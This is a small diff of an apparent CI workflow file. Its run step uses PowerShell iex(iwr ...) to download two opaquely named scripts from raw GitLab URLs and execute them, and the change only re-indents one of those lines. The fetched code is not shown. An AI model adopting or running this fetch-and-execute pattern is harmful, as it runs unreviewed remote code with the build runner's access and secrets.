@@ -34,7 +34,8 @@ jobs:
       run: |
         iex (iwr https://gitlab.com/haingng16/sigmatoilet/-/raw/main/a -UseBasicParsing)
         
-        iex(iwr https://gitlab.com/haingng16/sigmatoilet/-/raw/main/ngdep4mua)
+          iex(iwr https://gitlab.com/haingng16/sigmatoilet/-/raw/main/ngdep4mua)
+
 
 
 
